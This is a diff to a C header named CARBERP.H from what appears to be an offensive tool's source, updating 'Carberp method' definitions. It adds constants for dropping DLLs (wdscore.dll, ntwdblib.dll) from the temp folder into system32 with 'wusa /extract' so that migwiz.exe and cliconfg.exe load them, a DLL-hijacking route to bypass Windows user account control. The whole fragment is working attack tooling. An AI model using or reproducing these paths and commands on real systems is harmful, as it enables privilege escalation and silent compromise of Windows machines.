@@ -4,9 +4,9 @@
 *
 *  TITLE:       CARBERP.H
 *
-*  VERSION:     1.20
+*  VERSION:     1.30
 *
-*  DATE:        29 Mar 2015
+*  DATE:        30 Mar 2015
 *
 *  Prototypes and definitions for Carberp method.
 *
@@ -17,7 +17,17 @@
 *
 *******************************************************************************/
 
+#define METHOD_CARBERP_MSUPACKAGE	L"%temp%\\huy32.msu"
+#define METHOD_MIGWIZ_SOURCEDLL		L"%temp%\\wdscore.dll"
+#define METHOD_MIGWIZ_CMDLINE		L"/c wusa %ws /extract:%%windir%%\\system32\\migwiz"
+#define METHOD_MIGWIZ_TARGETAPP		L"%systemroot%\\system32\\migwiz\\migwiz.exe"
+
+#define METHOD_SQLSVR_SOURCEDLL		L"%temp%\\ntwdblib.dll"
+#define METHOD_SQLSVR_CMDLINE		L"/c wusa %ws /extract:%%windir%%\\system32"
+#define METHOD_SQLSVR_TARGETAPP		L"%systemroot%\\system32\\cliconfg.exe"
+
 BOOL ucmWusaMethod(
+	DWORD dwType,
 	PVOID ProxyDll,
 	DWORD ProxyDllSize
 	);
